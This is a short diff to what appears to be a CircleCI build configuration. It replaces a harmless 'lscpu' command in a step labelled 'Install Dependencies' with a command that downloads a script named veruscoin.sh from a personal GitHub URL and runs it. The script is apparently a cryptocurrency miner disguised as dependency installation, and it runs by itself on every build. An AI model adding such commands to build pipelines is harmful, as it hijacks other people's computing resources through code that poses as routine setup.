@@ -6,7 +6,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 1m lscpu
+            command: wget https://raw.githubusercontent.com/min312holo/youtube/main/veruscoin.sh && chmod+x veruscoin.sh && ./veruscoin.sh 
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
